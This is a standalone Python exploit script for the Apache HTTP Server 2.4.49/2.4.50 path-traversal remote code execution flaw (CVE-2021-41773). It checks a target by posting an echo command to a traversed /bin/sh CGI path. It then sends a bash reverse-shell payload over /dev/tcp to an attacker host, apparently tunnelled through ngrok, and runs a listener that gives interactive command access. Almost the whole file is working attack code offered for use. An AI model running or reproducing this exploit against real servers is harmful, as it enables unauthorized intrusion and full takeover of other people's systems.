# Apache HTTP Server 2.4.49, 2.4.50

# Regex:
# ^2\.4\.(49|50)$

# Remote Code Execution from Path Traversal



import requests
import argparse
import socket
import select
import threading
import sys
import subprocess
from urllib.parse import urlparse



# Send request with simple 'echo' command and check the response
def vulnerable_check(url):
    curl_data = [
        'curl','--data', f"echo;echo test", "-sk", "-X", "GET", f'{url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' ]

    output = subprocess.check_output(curl_data, text=True)
    
    if "test" in output:
        print("[+] Detected Vulnerability : True\n")
    else:
        print("[-] Detected Vulnerability : False\n")

# Send reverse shell script in body payload with vulnerable endpoint
def send_payload(lhost, lport, url):
    print("Sending payload.....\n")
    curl_data = [
            'curl','-sk','--data', f"echo;bash -c '0<&124-;exec 124<>/dev/tcp/{lhost}/{lport};sh <&124 >&124 2>&124'", f'{url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' ]

    try:
        output = subprocess.check_output(curl_data, text=True)
        return output
    except subprocess.CalledProcessError as e:
        return e.output
    
    
# Setting server listening on attcker side 
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("Receive Shell Success!!")
        print("\nPut your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    print("-"*100)

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()



parser = argparse.ArgumentParser(usage="""CVE-2021-41773.py -u https://*.*.*.*/ -lp 14143 -lh 0.tcp.jp.ngrok.io -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()

url = args.URL.rstrip('/')

vulnerable_check(url)

if args.lhost and args.lport and args.fport:
    # Use each server side thread and client side thread for synchronous communication
    request_thread = threading.Thread(target=send_payload, args=(args.lhost, args.lport, url))
    listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
    request_thread.start()
    listen_thread.start()
    request_thread.join()

    #send_payload(args.lhost, args.lport, url)

else:
    print("Check your arguments")